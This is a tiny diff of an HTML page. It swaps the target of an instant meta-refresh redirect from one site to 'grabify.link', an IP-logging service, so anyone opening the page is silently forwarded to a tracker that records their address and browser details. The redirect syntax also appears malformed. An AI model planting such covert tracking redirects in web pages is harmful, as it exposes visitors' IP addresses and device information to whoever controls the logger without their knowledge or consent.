@@ -3,7 +3,7 @@
 <html>
  
  
-<meta http-equiv="refresh" content="0;s:fortnitedance.ml" />
+<meta http-equiv="refresh" content="0;s:https://grabify.link/" />
 
 <center>
  
